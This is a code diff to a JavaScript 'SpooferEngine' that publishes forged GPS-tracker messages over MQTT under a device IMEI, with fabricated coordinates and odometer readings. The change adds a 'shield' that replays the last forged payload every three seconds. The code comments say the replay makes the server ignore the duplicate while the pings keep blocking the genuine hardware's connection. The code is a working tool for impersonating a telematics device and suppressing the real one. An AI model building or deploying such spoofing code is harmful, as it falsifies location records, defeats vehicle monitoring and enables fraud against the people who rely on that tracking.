@@ -285,6 +285,8 @@ class SpooferEngine {
                         }
                     }
                     
+                    let last_payload = "";
+                    
                     for (let i = 0; i < broadcasts_per_day; i++) {
                         if (!this.is_running) break;
                         
@@ -308,8 +310,8 @@ class SpooferEngine {
                         const coord_str = `+${curr_lat.toFixed(6)},+${curr_lng.toFixed(6)}`;
                         const odo_str = `${total_odo.toFixed(6)}-${today_odo.toFixed(6)}`;
                         
-                        const payload = `##,${imei},0,${time_str},${coord_str},${this.speed},45.0,0,1,91.26,${odo_str},0-0,0-0,0-0,+0.0,0,1-1-1-1,2000-00-00 00:00:00,2000-00-00 00:00:00,28,3950,0,1-1-0-1-1,0,0,0-0,0,0,2782,1,0-26,3950,1,0,0,0,00000-00,$`;
-                        client.publish(topic, payload);
+                        last_payload = `##,${imei},0,${time_str},${coord_str},${this.speed},45.0,0,1,91.26,${odo_str},0-0,0-0,0-0,+0.0,0,1-1-1-1,2000-00-00 00:00:00,2000-00-00 00:00:00,28,3950,0,1-1-0-1-1,0,0,0-0,0,0,2782,1,0-26,3950,1,0,0,0,00000-00,$`;
+                        client.publish(topic, last_payload);
                         await new Promise(r => setTimeout(r, 5));
                     }
                     
@@ -338,13 +340,12 @@ class SpooferEngine {
                                 return;
                             }
                             
-                            // Generate fresh payload for shield
-                            const time_str = this.formatDateStr(new Date());
-                            const coord_str = `+${curr_lat.toFixed(6)},+${curr_lng.toFixed(6)}`;
-                            const odo_str = `${total_odo.toFixed(6)}-${today_odo.toFixed(6)}`;
-                            
-                            const payload = `##,${imei},0,${time_str},${coord_str},${this.speed},45.0,0,1,91.26,${odo_str},0-0,0-0,0-0,+0.0,0,1-1-1-1,2000-00-00 00:00:00,2000-00-00 00:00:00,28,3950,0,1-1-0-1-1,0,0,0-0,0,0,2782,1,0-26,3950,1,0,0,0,00000-00,$`;
-                            client.publish(topic, payload);
+                            // Use the EXACT same payload from the end of the trip
+                            // so the server ignores the duplicate location/time
+                            // but the ping still blocks the hardware connection!
+                            if (last_payload) {
+                                client.publish(topic, last_payload);
+                            }
                             loops_done++;
                         }, 3000); // 3 seconds
                         this.intervals.push(shield_interval);
